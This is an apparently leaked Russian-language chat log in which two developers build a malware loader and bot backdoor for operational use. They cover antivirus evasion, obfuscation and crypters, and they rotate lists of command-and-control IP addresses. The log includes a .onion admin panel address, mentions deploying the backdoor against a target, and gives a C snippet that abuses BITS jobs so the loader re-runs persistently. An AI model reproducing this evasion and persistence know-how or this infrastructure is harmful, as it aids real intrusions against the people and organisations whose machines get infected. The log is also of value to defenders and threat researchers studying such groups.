2020-07-29 14:16:46.318778	mushroom	frog	У меня Windows Defender сразу сожрал твой dl7.exe
2020-07-29 14:16:56.541602	mushroom	frog	x86
2020-07-29 14:17:14.319967	mushroom	frog	#unWhM}yn|~h6d3N
2020-07-29 14:17:22.494578	mushroom	frog	VirTool:Win32/Obfuscator.QV
2020-07-29 14:17:38.791664	mushroom	frog	Версия без логов.
2020-07-29 14:18:31.684934	frog	mushroom	Хорошо. Посмотрю.
2020-07-29 14:20:51.665677	mushroom	frog	inet_ntop
inet_pton
2020-07-29 14:21:00.323726	mushroom	frog	Убери из импорта.
2020-07-29 14:21:08.046879	mushroom	frog	Это для dl7
2020-07-29 14:23:25.594190	frog	mushroom	Да вроде давно уже убрал. Может старую какую-то версию смотришь?
2020-07-29 14:24:13.107127	mushroom	frog	Да. Сорян старую смотрел.
2020-07-29 14:25:26.290642	mushroom	frog	Ole32 убери из импорта.
2020-07-29 14:25:49.443326	mushroom	frog	CoGetClassObject
2020-07-29 14:26:05.090473	mushroom	frog	Она там одна у тебя в импорте dl7
2020-07-29 14:31:18.216922	mushroom	frog	Всё остальное норм обфусцированно.
2020-07-29 14:58:50.002603	frog	mushroom	Вот что за сегодня получилось:
32-разрядная версия загрузчика:
https://dyncheck.com/scan/id/15a2bc6c34388e5318dde882b4220567
64-разрядная версия загрузчика:
https://dyncheck.com/scan/id/1aed5c6380af122bbbf8d0b89939d96f
2020-07-29 15:00:38.367086	mushroom	frog	Хорошо получилось. Странно что у 32 нету детектов файервола. Он работает, скачивает и запускает бот?
2020-07-29 15:01:21.286276	mushroom	frog	А у 64 они есть.
2020-07-29 15:03:47.620091	frog	mushroom	На своей машине скачивает, запускает. А на dyncheck не знаю, нелогированные же версии проверяю, консоли не вижу.
2020-07-29 15:04:21.932462	mushroom	frog	Хорошо. Импорт убрал ole32?
2020-07-29 15:04:41.792795	frog	mushroom	Убрал
2020-07-29 15:05:34.792810	mushroom	frog	Обнови адреса.
2020-07-29 15:05:36.318288	mushroom	frog	лоадеры
31.214.240.203 
78.108.216.13
195.123.240.6
194.5.249.163
80.82.68.132
62.108.35.215


бот
85.204.116.188             
80.82.68.32
194.5.249.164
185.14.31.135 
45.148.120.142
62.109.13.184
2020-07-29 15:06:12.403621	mushroom	frog	И собери и Бентли отдай (с логами\без логов) весь комплект.
2020-07-29 15:08:51.824495	frog	mushroom	Хорошо. Он же наверное тот комплект проверяет? Сегодня он спрашивал у меня генератор идентификатора.
2020-07-29 15:09:24.148829	mushroom	frog	Собирался. Пока он мой проверяет. Ещё успеешь отдать новый.
2020-07-30 13:22:38.011699	mushroom	frog	Привет пришли Бузе генератор id для бота.
2020-07-30 13:23:10.055685	frog	mushroom	Хорошо. Сейчас сделаю
2020-07-30 13:24:29.626920	mushroom	frog	Через qaz.im сделай.
2020-07-31 09:26:00.780707	mushroom	frog	CMake проект есть, чтобы компилировать MinGW можно было лоадер и бот?
2020-07-31 09:26:20.838262	frog	mushroom	Нет
2020-07-31 09:26:52.662565	mushroom	frog	Сделай, пока тестировать будут твой комплект.
2020-07-31 09:27:48.118894	mushroom	frog	Clang ещё нужен, но он в Visual Studio уже интегрирован. И на работу будешь выдавать сразу 3 версии MSVC, Clang и MinGW.
2020-07-31 15:05:28.205236	frog	mushroom	Можно какой-нибудь пример Cmake-проекта посмотреть?
2020-07-31 15:57:44.211717	mushroom	frog	Сейчас пришлю.
2020-07-31 16:00:35.010378	mushroom	frog	Download: https://qaz.im/load/QiGbaG/sSA8NQ   
Delete: https://qaz.im/index.php?a=delete&q=562805300
Пароль: $$|Kg`COgZG=$(NR3
2020-07-31 16:01:42.579953	mushroom	frog	Это пример проекта для бота. Измени под свои файлы.
2020-08-04 07:54:10.145264	mushroom	frog	Привет писал тебе Бентли?
2020-08-04 07:54:11.679301	mushroom	frog	<bentley> на 7 отработало полностью на 10 и 2019 не работало вообще. И логи не появлялись 
[10:53:47] <bentley> При запуск версии с логами
2020-08-04 07:54:19.678930	mushroom	frog	Это твой комплект.
2020-08-04 08:02:11.901686	mushroom	frog	Разберись. Меня в курсе держи.
2020-08-05 08:28:03.404808	mushroom	frog	Привет. Ну как работа на Win 10 и Server 2019?
2020-08-05 08:34:48.924323	frog	mushroom	Привет! Разбираюсь, ищу ошибки. На Windows 10 заработало.
2020-08-05 08:50:09.316937	mushroom	frog	OK.
2020-08-05 12:29:38.011555	frog	mushroom	Отправил Bentley комплект на тестирование. Последние версии обоих проектов загрузил на gitlab.
2020-08-05 12:30:12.363394	mushroom	frog	OK.
2020-08-07 10:21:45.099363	mushroom	frog	Бентли сказал что на Win Server 2019 детект сразу после перезагрузки происходит с твоим комплектом. Допили чтобы не было его.
2020-08-07 10:28:20.990244	frog	mushroom	Привет. У меня машины с Windows Server 2019 нет. По удалёнке к этой ОС как-нибудь можно подключиться?
2020-08-07 10:59:56.438216	mushroom	frog	У Бентли спроси.
2020-08-07 11:00:34.715054	mushroom	frog	Он тебе даст доступ.
2020-08-10 12:19:34.705832	frog	mushroom	Привет! Какие сейчас ip-адреса?
2020-08-10 12:24:57.142337	mushroom	frog	Пока не знаю.
2020-08-11 08:41:16.653673	mushroom	frog	Если еще нужно вот адреса:

лоадеры
31.214.240.203 
78.108.216.13
195.123.240.6
194.5.249.163
80.82.68.132
62.108.35.215


бот
80.82.68.32
194.5.249.164
195.123.237.241 
37.220.6.122 
45.148.120.142
62.109.13.184
2020-08-12 09:44:52.116158	mushroom	frog	Привет. Ну как с Win Server 2019?
2020-08-12 09:51:10.539163	frog	mushroom	Привет! Разбираюсь пока. Попросил Bentley ещё на других машинах протестировать. На той, которую он предоставил, детекты пропали.
2020-08-12 09:51:44.792219	mushroom	frog	То есть ты починил и отдал ему на тесты?
2020-08-12 09:56:40.061316	frog	mushroom	Да там особо ничего не чинил. Разбирался, в чём причина, а они пропали сами по себе. Кроме ip-адресов, по сути, ничего не менял. Поэтому попросил его протестировать на других машинах.
2020-08-12 09:57:34.957031	mushroom	frog	Когда отдавал на тесты? Ничего он не писал ещё?
2020-08-12 09:57:54.108888	frog	mushroom	Вчера отдал. Пока не писал.
2020-08-12 09:58:36.678681	mushroom	frog	Понял.
2020-08-13 09:35:42.569750	mushroom	frog	Привет. Прошёл тесты твой комплект. Сделал чтобы можно было 3 компиляторами собирать?
2020-08-13 09:37:34.271371	frog	mushroom	Привет. Не сделал. Начал тогда делать на mingw, много ошибок было. Сходу не получилось.
2020-08-13 09:38:03.774314	mushroom	frog	Ну вот пока нечего делать больше, сделай.
2020-08-13 09:38:49.204909	mushroom	frog	Clang в Visual Studio уже встроен, нужно только MinGW.
2020-08-13 09:39:43.571749	mushroom	frog	Пока по поводу комплекта ждём Бузу. Он скажет кому его в работу отдавать.
2020-08-13 09:40:32.406586	mushroom	frog	В отдельной ветке все эксперименты теперь веди, чтобы чистую рабочую версию не портить.
2020-08-13 09:42:10.612630	frog	mushroom	Хорошо
2020-08-14 11:54:21.617459	mushroom	frog	Привет. Сделай на dyncheck тест на динамику своего последнего загрузчика (который Бентли тестировал) и пришли мне ссылку.
2020-08-14 13:55:06.226547	frog	mushroom	Привет. Это 64-разрядная версия:
https://dyncheck.com/scan/id/d5c95e14a38de0b433faf026dfb29ad6
2020-08-14 13:59:44.261179	mushroom	frog	OK. А что их больше стало чем было раньше?
2020-08-14 14:06:40.351203	mushroom	frog	32 битный тоже сделай.
2020-08-14 14:15:54.067028	frog	mushroom	Да, с какого-то времени они заметили регистрацию в реестре.
2020-08-14 14:16:18.192991	mushroom	frog	Почисти.
2020-08-14 14:22:14.311757	frog	mushroom	Это тест для 32-разрядного:
https://dyncheck.com/scan/id/b726d93392c6a2b6cc301ef71f7f1a5e
2020-08-19 11:18:21.861318	mushroom	frog	Привет почистил динамические детекты у загрузчика? Если почистил пришли мне ссылки на dyncheck.
2020-08-19 11:32:31.592911	frog	mushroom	Привет. Ещё не почистил
2020-08-20 13:14:27.723793	mushroom	frog	Привет. Ну как там с детектами?
2020-08-20 13:20:58.656749	frog	mushroom	Привет. Ну как там с детектами?
2020-08-20 14:32:41.304501	frog	mushroom	Привет.
Какие сейчас IP-адреса?
2020-08-20 14:34:45.486045	mushroom	frog	лоадеры
82.146.37.128
107.155.137.18
195.123.240.6
86.104.194.29 
195.123.241.68
195.123.241.175


бот
91.200.100.85 
95.171.15.71
195.123.237.241 
37.220.6.122 
51.89.204.242
195.123.240.52
2020-08-20 14:35:06.525416	frog	mushroom	спасибо
2020-08-21 09:06:01.752300	mushroom	frog	Привет. Посмотрел сейчас то что в GitLab
2020-08-21 09:06:16.858351	mushroom	frog	Информация о системе нормально работает.
2020-08-21 09:06:24.539068	mushroom	frog	Hollowing не работает.
2020-08-21 09:06:38.438125	mushroom	frog	Не сюда написал.
2020-08-21 09:07:01.363424	mushroom	frog	Напиши мне когда разберёшся с детектами.
2020-08-21 09:11:15.707786	frog	mushroom	Привет. Не знаешь, детект IDP.Generic отчего возникает?
2020-08-21 09:13:25.782931	frog	mushroom	Он то возникает, то нет с одним и тем же файлом.
2020-08-21 09:16:13.872306	mushroom	frog	Не не знаю. Это у какого антивируса?
2020-08-21 09:17:30.800985	frog	mushroom	AVG Internet Security и Avast. В 64-разрядной версии детектируют
2020-08-21 09:21:53.965102	mushroom	frog	Это статический детект?
2020-08-21 09:38:12.685591	frog	mushroom	Динамический
2020-08-21 09:40:01.229433	mushroom	frog	А ты пробовал отключать кусок программы и проверять на детекты, пока он не пропадёт?
2020-08-21 09:41:11.210584	mushroom	frog	Ещё смотри что там на картинках детектов, там несколько детектов я знаю всегда из-за файервола, они не считаются.
2020-08-21 09:41:11.626326	frog	mushroom	Конечно. Просто он то возникает, то нет. Вот в чём проблема.
2020-08-21 09:47:13.155337	mushroom	frog	Без них сколько детектов?
2020-08-21 09:47:36.076961	frog	mushroom	Без них сколько детектов?
2020-08-21 09:53:27.040992	mushroom	frog	Без них сколько детектов?
2020-08-21 09:53:51.259523	frog	mushroom	2 или 3
2020-08-21 09:54:09.177961	mushroom	frog	Файерволовские?
2020-08-21 09:54:28.948418	mushroom	frog	Пришли ссылки.
2020-08-21 09:55:28.863277	frog	mushroom	Вчера проверял:
https://dyncheck.com/scan/id/158c99f5d376565a9f8ae2bcb2be65ef
2020-08-21 09:56:50.261936	frog	mushroom	Avast установил, попробую выяснить в чём дело
2020-08-21 10:04:08.581538	mushroom	frog	Нормально. Comodo всегда детекты даёт там, он какой то там непонятный, другие это файервол, они не считаются.
2020-08-21 10:04:49.284151	mushroom	frog	В общем если не получиться разобраться отдавай Бентли эту версию на тесты.
2020-08-24 07:24:38.854615	frog	mushroom	Привет. Разбирался с динамическими детектами.
Получилось так. 
64-разрядная версия: 
https://dyncheck.com/scan/id/2f83b0fde38d24eb44e0ad4dbdbd186c
32-разрядная версия:
https://dyncheck.com/scan/id/d7dd896d903a61155799dd9ddc116ab1
2020-08-24 07:29:40.291690	frog	mushroom	BitDefender Total Security почему-то показывает детект даже на exe-файл, который ничего не делает (кроме ExitProcess сразу при запуске).
Dr Web не знаю что хочет. Пробовал ставить его на виртуальную машину, он ничего не спрашивал при запуске. Но версия была какая-то другая.
2020-08-24 07:30:47.989476	frog	mushroom	Malwarebytes Anti-Malware иногда спрашивает разрешения выйти в интернет.
2020-08-24 07:33:15.300267	frog	mushroom	AVG Internet Security и Avast Internet Security не нравилась регистрация в реестре (IDP.Generic, про который спрашивал). Это исправил. Эти антивирусы, оказываются, имею один и тот же движок
2020-08-24 07:35:47.398400	frog	mushroom	Если бы был доступ к машине с таким же антивирусом DrWeb, можно было бы попробовать разобраться.
2020-08-24 07:43:10.405130	mushroom	frog	Привет. Хорошо получилось. Отдавай эти версии Бентли на тесты.
2020-08-24 07:45:12.712594	frog	mushroom	Хорошо. Попросил Бентли пустить на машину с Windows Server 2019. Проверю на всякий случай, чтобы как тогда не было, а потом отдам на тесты.
Какие сейчас IP-адреса?
2020-08-24 07:47:34.800700	mushroom	frog	лоадеры
82.146.37.128
85.143.221.85
45.138.158.41
37.220.6.126
195.123.241.68
195.123.241.175


бот
91.200.100.85 
95.171.15.71
195.123.237.241 
37.220.6.122 
51.89.204.242
195.123.240.52
2020-08-28 10:10:08.432287	frog	mushroom	Привет. Отправил Bentley на тестирование следующий комплект
2020-08-28 10:24:01.118658	mushroom	frog	OK.
2020-08-31 12:34:26.858407	mushroom	frog	Привет твоя группа теперь для боевого бота это 7.
2020-08-31 12:34:35.630215	mushroom	frog	Внеси изменения.
2020-08-31 12:34:57.841225	mushroom	frog	seven это твоя тестовая группа на боевом сервере.
2020-08-31 12:35:22.957203	frog	mushroom	Привет. Хорошо
2020-08-31 12:35:57.001157	mushroom	frog	7 это группа уже для работы. Будешь её использовать в сборках, которые будешь отдавать в работу уже.
2020-08-31 12:36:41.599918	frog	mushroom	Т.е. вместо "seven" использовать "7"?
2020-08-31 12:36:58.598182	mushroom	frog	Для рабочих версий.
2020-08-31 12:37:04.669283	frog	mushroom	 Как прошло последнее тестирование?
2020-08-31 12:37:19.896952	mushroom	frog	А для тестирования seven.
2020-08-31 12:37:27.686709	mushroom	frog	Не спрашивал.
2020-08-31 12:37:43.752121	mushroom	frog	У тебя же есть Бентли, узнай.
2020-08-31 12:38:35.732720	mushroom	frog	Какой у тебя логин на боевом сервере?
2020-08-31 12:38:59.168043	frog	mushroom	b16
2020-08-31 12:40:13.503628	mushroom	frog	Проверь доступ к группе 7.
2020-08-31 12:41:58.299499	frog	mushroom	Появилась такая группа
2020-08-31 12:42:43.055118	mushroom	frog	Проверь как работает, загрузи файлы туда и протестируй.
2020-08-31 12:45:18.678471	mushroom	frog	И бот пометь как тестовый, чтобы не путаться.
2020-08-31 12:48:05.837488	mushroom	frog	лоадеры
82.146.37.128
85.143.221.85
45.138.158.41
37.220.6.126
164.132.76.76
195.123.241.175


бот
91.200.100.85 
212.22.70.4
194.156.98.46
37.220.6.122 
51.89.204.242
195.123.240.52
2020-08-31 12:48:50.416876	mushroom	frog	Проверишь когда группу 7. Если всё нормально отдавай эти сборки боевые с группой 7 Бентли.
2020-09-01 13:15:15.676937	mushroom	frog	Привет.
2020-09-01 13:15:41.350522	mushroom	frog	Твой бэкдор отдаём в работу Target.
2020-09-01 13:16:16.647849	frog	mushroom	Привет
2020-09-01 13:16:20.339826	mushroom	frog	Ты для группы 7 сделал боевую сборку?
2020-09-01 13:16:37.671208	frog	mushroom	Нет, пока не сделал
2020-09-01 13:17:09.028562	mushroom	frog	Сделай, отдай её Бентли, он проверит, закрептует её и отдаст Target в работу.
2020-09-01 13:17:27.637714	frog	mushroom	Хорошо
2020-09-01 13:42:23.086353	mushroom	frog	И ещё забыл сказать. Теперь каждая новая сборка для группы 7 увеличивай версию бота и загрузчика, и сборки делай тремя компиляторами MinGW, Clang, MSVC у всех трёх одна версия. Потом на следующий день делаешь новую сборку, у всех трёх увеличиваешь версию. Например сегодня у тебя 1.5 у всех, завтра 1.6
2020-09-01 13:44:22.221599	mushroom	frog	И обнови на Гитлаб проекты свои до последних стабильных версий которые делаешь, если ещё не сделал этого.
2020-09-01 13:45:51.233219	frog	mushroom	Там сейчас стабильные версии. То, что сейчас отправлено на тестирование оно же на gitlab.
2020-09-01 13:46:05.500699	mushroom	frog	Просто уточнил.
2020-09-01 13:46:45.022454	frog	mushroom	Версию так и увеличиваю. Хотел подождать результатов тестирования. Bently сказал, что ещё тестирует.
2020-09-01 13:47:28.525858	mushroom	frog	Для группы 7 каждый раз увеличивай как отдаёшь.
2020-09-01 13:47:45.174146	mushroom	frog	Для группы seven как хочешь, она тестовая.
2020-09-01 13:49:48.745910	frog	mushroom	Насчёт группы всё понял.
Clang, MSVC пробовал компилировать, всё нормально. MinGW ещё не успел сделать, в последний раз пробовал скомпилировать, куча ошибок вывалилась, ещё не успел исправить. Да и потом ещё затеял написать обфускатор системных вызовов. Хотел отладить его и скомпилировать в MinGW.
2020-09-01 13:50:24.344604	mushroom	frog	Значит пока MSVC и Clang делай.
2020-09-01 13:51:30.679284	mushroom	frog	У нас кстати есть Clang обфускатор, который программу очень сильно обфусцирует.
2020-09-01 13:51:48.787709	mushroom	frog	В redmine про это написано.
2020-09-01 13:54:21.326083	frog	mushroom	Хорошо, посмотрю.
Хотел ещё посоветоваться по такому поводу. Можно ли закрепление в системе, загрузку с сервера делать тоже в режиме маскировки. Т.е. чтобы не сам dl7.exe это делал, а некий зашифрованный исполняемый файл, который распаковывается, например, из файла ресурсов и запускается в режиме маскировки?
2020-09-01 13:55:15.013050	frog	mushroom	Или PE-загрузчик, который делает то же, но в контексте собственного процесса?
2020-09-01 13:55:59.994558	mushroom	frog	Это делает крипт.
2020-09-01 13:56:43.317502	mushroom	frog	Это программа в которую твой загрузчик запихивают, она потом его достаёт и запускает как Hollowing например.
2020-09-01 13:56:53.791692	mushroom	frog	Это делает другой человек.
2020-09-01 13:57:10.111203	mushroom	frog	Бентли ему твой загрузчик отдаёт для этого.
2020-09-01 13:57:48.983477	frog	mushroom	Ааа... Т.е. борьба со статическими детектами делается просто для подстраховки?
2020-09-01 13:57:57.654163	mushroom	frog	Да.
2020-09-01 13:59:09.029609	frog	mushroom	Теперь всё стало яснее. Спасибо!
2020-09-01 14:02:05.170276	mushroom	frog	Бузу добавь в свои проекты как Master. Он на GitLab binman.
2020-09-01 14:02:29.663399	frog	mushroom	Хорошо
2020-09-01 14:02:51.114319	frog	mushroom	А логин какой у него?
2020-09-01 14:03:03.674354	frog	mushroom	А всё, понял
2020-09-01 14:03:03.998870	mushroom	frog	binman
2020-09-01 14:07:44.999233	frog	mushroom	Добавил
2020-09-01 14:08:00.747946	mushroom	frog	OK.
2020-09-01 15:50:13.418746	mushroom	frog	А ты Бентли отдавал на тесты с группой 7 комплект?
2020-09-01 15:50:23.683493	mushroom	frog	Или seven?
2020-09-01 15:50:38.831749	frog	mushroom	seven ещё тестируется
2020-09-01 15:51:53.216548	frog	mushroom	Устранял динамические детекты, потом ещё раз отдал на тестирование
2020-09-01 15:52:34.479694	mushroom	frog	Сделай сразу 7. Он её протестирует.
2020-09-01 15:53:54.351027	mushroom	frog	Он её проверит и если всё норм отдаст в работу.
2020-09-01 15:55:30.724191	mushroom	frog	Та что не жди тестов для seven. Сделай такую же для группы 7 и отдай Бентли.
2020-09-01 15:55:39.639124	frog	mushroom	Хорошо
2020-09-02 07:44:22.986462	frog	mushroom	Привет. Отправил Bentley на тестирование комплект с группой "7".
2020-09-02 07:50:39.264564	mushroom	frog	Хорошо.
2020-09-03 08:48:45.215660	mushroom	frog	Ну как тесты группы 7?
2020-09-03 08:50:20.981767	frog	mushroom	Привет. Всё прошло нормально
2020-09-03 08:51:03.428382	mushroom	frog	Тогда теперь каждый день надо делать новую сборку с увеличением версии и отдавать Бентли.
2020-09-03 08:51:31.291564	mushroom	frog	Всеми компиляторами, которыми на данный момент можешь сделать.
2020-09-03 08:51:57.062781	frog	mushroom	Понятно
2020-09-03 08:52:23.101801	mushroom	frog	Ну и пока делать нечего доделай MinGW.
2020-09-03 08:52:58.181393	frog	mushroom	Обфускатор же ещё пишу. Есть что делать.
2020-09-03 08:55:21.273123	frog	mushroom	А в обфускаторе строк можно как-нибудь подавить предупреждение "недопустимый неполный тип", не знаешь?
2020-09-03 08:55:49.934671	mushroom	frog	Я думаю нельзя.
2020-09-03 08:56:26.783398	mushroom	frog	Так как во время компиляции только строки по факту превращаются в шифрованные массивы.
2020-09-04 08:11:14.302065	mushroom	frog	Привет. Адреса.
лоадеры
82.146.37.128
85.143.221.85
45.138.158.41
37.220.6.126
164.132.76.76
195.123.241.175


бот
93.189.46.41 
212.22.70.4
194.156.98.46
81.177.139.38
54.37.237.253
195.123.240.52
2020-09-04 08:11:35.261293	mushroom	frog	Или тебе Green присылает их?
2020-09-04 08:32:39.433363	frog	mushroom	Привет. Никто не присылает. Детект один статический появился. Разберусь, потом вышлю Бентли комплект
2020-09-07 07:10:58.440240	mushroom	frog	лоадеры
82.146.37.128
85.143.221.85
195.123.241.194
37.220.6.126
164.132.76.76
195.123.241.175


бот
93.189.46.41 
212.22.70.4
194.156.98.46
81.177.139.38
54.37.237.253
185.164.32.107
2020-09-08 13:57:01.085025	frog	mushroom	Привет. Bentley сказал админка поменялась, просит сделать новую сборку. Не пойму, что нужно поменять в коде?
2020-09-08 13:57:19.489071	mushroom	frog	В коде ничего.
2020-09-08 13:57:38.171787	mushroom	frog	Адреса те же работают.
2020-09-08 13:58:01.494951	mushroom	frog	https://scrytnuuszglaugg.onion:4247/login
2020-09-08 13:58:15.154763	mushroom	frog	Это адрес для браузера.
2020-09-08 13:59:31.175658	mushroom	frog	Если логин твой не подходит, напиши Бузе он тебе пароль даст.
2020-09-08 14:00:37.172874	frog	mushroom	IP-адреса сегодня те же?
2020-09-08 14:02:22.234434	mushroom	frog	Да.
2020-09-09 13:19:01.658938	mushroom	frog	Привет. Адреса:
лоадеры
82.146.37.128
85.143.221.85
195.123.241.194
37.220.6.126
164.132.76.76
195.123.241.175


бот
93.189.46.41 
212.22.70.4
194.156.98.46
93.189.40.214
54.37.237.253
185.164.32.107
2020-09-09 13:19:12.738552	mushroom	frog	Делаешь каждый день сборку новую?
2020-09-09 13:20:32.657509	frog	mushroom	Привет. Вчера делал. Сегодня ещё нет. Bentley вчерашнюю ещё не проверил.
2020-09-09 13:21:27.727995	mushroom	frog	А что детекты были или изменял что?
2020-09-09 13:22:20.288483	frog	mushroom	Да, изменял. Были детекты.
2020-09-09 13:22:38.569166	mushroom	frog	Если просто пересобираешь уже проверенную версию, не нужно ждать пока он проверит. Просто собрал и ему отослал, он их накапливает для работы.
2020-09-09 13:23:03.522664	frog	mushroom	Хорошо.
2020-09-09 13:26:54.525477	mushroom	frog	А пароль тебе сделали для админки?
2020-09-09 13:27:29.137423	mushroom	frog	https://scrytnuuszglaugg.onion:4247/login можешь зайти сюда?
2020-09-09 13:28:24.000414	frog	mushroom	Писал вчера Бузе, просил дать новый пароль.
Зайти не получается, старый логин и пароль не подходит.
2020-09-09 13:28:57.565661	mushroom	frog	Буза судя по всему не заметил или сообщение не дошло.
2020-09-09 14:53:25.668762	mushroom	frog	Какой у тебя логин?
2020-09-09 14:53:35.373279	frog	mushroom	b16
2020-09-09 14:56:48.519185	mushroom	frog	Дошло сообщение?
2020-09-09 14:57:00.526162	frog	mushroom	Да, сейчас проверяю
2020-09-09 15:01:35.522695	frog	mushroom	Зашёл в админку, всё нормально. Ты логин спросил. Ещё что-то писал?
2020-09-09 15:01:52.515467	mushroom	frog	Нет.
2020-09-10 15:44:46.372653	frog	mushroom	Привет. Мне отправлять сегодня комплект? Просто есть что исправлять
2020-09-10 15:57:35.636547	mushroom	frog	Привет. Каждый день отправляй если работает.
2020-09-14 08:41:07.771361	frog	mushroom	Привет. Какие сегодня ip-адреса?
2020-09-14 08:43:43.835428	mushroom	frog	Привет. Такие:
лоадеры
82.146.37.128
85.143.221.85
195.123.241.194
37.220.6.126
164.132.76.76
164.68.107.165


бот
93.189.46.41 
212.22.70.4
194.156.98.46
93.189.40.214
54.37.237.253
185.164.32.107
2020-09-15 12:07:59.271306	frog	mushroom	Привет. IP-адреса сегодня изменились?
2020-09-15 12:27:06.146676	mushroom	frog	Привет. Нет.
2020-09-16 07:52:17.694367	mushroom	frog	Привет.
лоадеры
82.146.37.128
85.143.221.85
195.123.241.194
37.220.6.126
164.132.76.76
164.68.107.165


бот
51.89.177.8 
212.22.70.4
194.156.98.46
93.189.40.214
54.37.237.253
185.164.32.107
2020-09-16 12:11:16.473035	frog	mushroom	Привет.
Как вызвать функцию addBitsJob из модуля anchorage для закрепления в системе? Есть пример?
2020-09-16 12:16:36.420906	mushroom	frog	Пример:
WCHAR tmpFileName[LCG_RANDOM_IN_RANGE(MAX_PATH + 1, MAX_PATH + 41)];
    kernel32.getTempPathW(_countof(tmpFileName), tmpFileName);
    kernel32.getTempFileNameW(tmpFileName, (PCWSTR)L'\0', 0, tmpFileName);

    WCHAR filename[LCG_RANDOM_IN_RANGE(MAX_PATH + 1, MAX_PATH + 41)];
    if (kernel32.getModuleFileNameW(NULL, filename, _countof(filename)))
    {
        WCHAR remoteName[LCG_RANDOM_IN_RANGE(30, 30 * 2)];
        lstrcpyW(remoteName, _WCS(L"https://google.com/update.exe"));
        WCHAR description[LCG_RANDOM_IN_RANGE(19, 19 * 2)];
        lstrcpyW(description, _WCS(L"Update maintenance"));

        if (!addBitsJob(remoteName, tmpFileName, description, filename/*, NULL*/))
        {
            debug_printf(TEXT("Can't add bits copy job\n"));
        }
2020-09-16 12:17:33.542705	mushroom	frog	Смысл в том чтобы дать заранее левый адрес. Тогда эта система перейдёт в состояние ошибки и будет вызывать постоянно нужную нам программу (загрузчик).
2020-09-16 12:18:15.184216	mushroom	frog	Загрузчик в этом случае должен тогда возвращать 1. Тогда система будет вызывать его всегда, пока он не вернёт 0.
2020-09-16 12:22:22.945699	frog	mushroom	Спасибо. Буду разбираться.
2020-09-17 14:24:16.277147	frog	mushroom	Привет! IP-адреса сегодня изменились?
2020-09-17 14:56:17.005963	mushroom	frog	Вот:
лоадеры
82.146.37.128
85.143.221.85
45.148.10.190
86.104.194.77
164.132.76.76
164.68.107.165


бот
51.89.177.8 
212.22.70.4
194.156.98.46
93.189.40.214
54.37.237.253
185.164.32.107
2020-09-17 14:56:23.583089	mushroom	frog	Немного изменились.
2020-09-18 11:22:03.675033	mushroom	frog	Привет у тебя на данный момент как с детектами?
2020-09-18 12:09:29.062310	frog	mushroom	Привет. Бентли сегодня тестировал. Появился детект. Сейчас разбираюсь.
2020-09-18 12:10:14.174456	mushroom	frog	Как называется?
2020-09-18 12:11:08.427248	frog	mushroom	Trojan:Script/Wacatac.B!ml
Behavior:Win32/Persistence.GI!ml
2020-09-18 12:11:39.878031	mushroom	frog	Behavior:Win32/Persistence.GI!ml это наверное из-за того что в реестр пишешь.
2020-09-18 12:13:39.524585	frog	mushroom	Может убрать запись в реестр? Оставить создание ярлыка и задания BITS?
2020-09-18 12:15:05.256823	mushroom	frog	Попробуй по одному попробовать, что уберёт детект то и оставляй.
2020-09-18 12:24:22.650463	mushroom	frog	Что у тебя из моего кода в загрузчике есть? У меня тоже Wacatac.
2020-09-18 12:36:11.971816	frog	mushroom	Модуль crypter.
emercoinResolveDns
2020-09-18 12:55:56.365552	frog	mushroom	Проверка  локализации.
Закрепление в системе. 
Удаление хуков.
Но все эти модули обфусцирую по-своему и них много менял. libraryproxy переписал по-своему.
2020-09-18 13:49:00.088166	mushroom	frog	Адреса:
лоадеры
194.5.249.156
85.143.221.85
45.148.10.190
86.104.194.77
164.132.76.76
164.68.107.165


бот
51.89.177.8 
212.22.70.4
194.156.98.46
93.189.40.214
54.37.237.253
185.164.32.107
2020-09-18 15:08:46.283763	frog	mushroom	Уточнить хотел. В системе же закрепляется exe-файл (загрузчик имею ввиду), который запускается первым или тот, что загружается с сервера и запускается вторым тоже нужно закреплять в системе?
2020-09-18 15:10:04.903412	mushroom	frog	Закрепляется один, если на сервере окажется другая версия, он скачивается и запускается.
2020-09-18 15:10:36.886526	mushroom	frog	То есть если скачался новый, то старый удаляется, новый уже сам закрепиться.
2020-09-18 15:16:02.546953	frog	mushroom	А как правильно записывать информацию об антивируснике? Делал так: 
&av=name
и так:
&av[1]=name1&av[2]=name2
Но что-то ни первый способ, ни второй не показывает потом информацию об антивируснике при нажатии на "more bot info". Хотя в самой команде вся информация есть.
2020-09-18 15:19:48.782738	mushroom	frog	&av[0]=name1&av[1]=name2&avp[0]=ver1&avp[1]=ver2
2020-09-18 15:19:56.735047	mushroom	frog	У меня так.
2020-09-18 15:21:38.631190	frog	mushroom	Спасибо
Буза ещё сказал с митигациями разобраться и запрет на старт потоков сделать. Можно какой-нибудь пример посмотреть или почитать об этом где можно?
2020-09-18 15:23:58.428915	mushroom	frog	Я сам ещё не разбирался, но думаю это типа этого https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setprocessmitigationpolicy
2020-09-18 15:24:49.832976	frog	mushroom	Понятно, нужно разбираться
2020-09-18 15:27:36.479929	frog	mushroom	Задания BITS какой утилитой можно просматривать?
2020-09-18 16:18:18.767672	mushroom	frog	bitsadmin /list
2020-09-18 16:18:28.217605	mushroom	frog	bitsadmin /list /verbose
2020-09-18 16:18:34.614797	mushroom	frog	bitsadmin /reset
2020-09-18 16:18:51.155995	mushroom	frog	Посмотреть, подробнее, удалить задания.
2020-09-21 17:05:45.131846	mushroom	frog	Привет. Просьба теперь каждый день писать мне что там по детектам у загрузчика. А я буду передавать Стерну.
2020-09-21 17:07:53.895571	frog	mushroom	Привет. Просьба теперь каждый день писать мне что там по детектам у загрузчика. А я буду передавать Стерну.
2020-09-22 09:43:04.107352	mushroom	frog	Привет, изменения в командах, у бота появилась команда 18, она означает закрепиться в системе. Получается закрепление нужно убрать из загрузчика если ты его сделал и перенести в бот. Получается так загрузчик передаёт путь к своему файлу в бот. И бот если получит команду 18 использует этот путь для закрепления в системе загрузчика. Бот по прежнему нельзя сохранять на диск.
2020-09-22 11:47:35.455015	mushroom	frog	Привет, изменения в командах, у бота появилась команда 18, она означает закрепиться в системе. Получается закрепление нужно убрать из загрузчика если ты его сделал и перенести в бот. Получается так загрузчик передаёт путь к своему файлу в бот. И бот если получит команду 18 использует этот путь для закрепления в системе загрузчика. Бот по прежнему нельзя сохранять на диск.
2020-09-22 11:51:28.575436	frog	mushroom	Привет. Хорошо.
2020-09-22 12:26:00.972253	frog	mushroom	Удалось выяснить причину детекта Wacatac? Мне показалось, что это из-за обфускатора строк. Когда убирал или укорачивал обфусцированные строки, он пропадал.
2020-09-22 12:27:37.413618	mushroom	frog	А просто если программу сделать с обфускатором строк и кучу строк там написать будет Wacatac?
